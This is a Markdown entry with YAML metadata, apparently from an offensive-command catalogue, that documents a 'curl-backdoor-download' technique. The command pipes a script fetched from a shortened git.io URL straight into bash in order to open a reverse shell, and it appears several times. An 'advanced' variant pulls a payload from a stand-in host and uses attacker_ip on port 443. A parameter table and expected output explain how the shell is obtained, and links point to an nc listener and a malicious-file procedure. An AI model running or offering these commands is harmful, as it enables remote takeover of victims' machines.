---
data: 'curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh'
tags:
  - rce
  - download
  - reverse-shell
type: command
output: null
executor: bash
platforms:
  - macOS
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.263Z'
id: 05a63d83-c877-4b32-ba35-81ffd021fbfa
verified: false
validated: true
submitted: true
---
# curl-backdoor-download

## Command

```bash
curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh
```

## Description

Downloads a remote script via curl and pipes it to bash for immediate execution, using arguments to set up a reverse shell connection; redirects output to a staging file. Used in payloads to fetch backdoors stealthily.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-L` | Follow redirects | Yes |
| `-s` | Silent mode (no progress bar) | Yes |
| `https://git.io/vXd2N` | URL of payload script | Yes |
| `| bash -s` | Pipe to bash in script mode | Yes |
| `localhost` | Target host for reverse connect (victim's view) | Yes |
| `80` | Port for connection | Yes |
| `> exploit.sh` | Redirect stdout to file | No |

## Examples

### Basic Usage

```bash
curl -Ls https://git.io/vXd2N | bash -s localhost 80 > exploit.sh
```

### Advanced Usage

```bash
curl -Ls https://example.com/payload.sh | bash -s attacker_ip 443 > /tmp/backdoor.sh
```

## Expected Output

Script downloads and executes silently; creates 'exploit.sh' with any logs, then attempts reverse connection (e.g., to nc listener), providing shell if successful. No visible output due to -s flag.

## Related

- [[commands/nc-listener]]
- [[procedures/Create-Malicious-Terminal-File]]
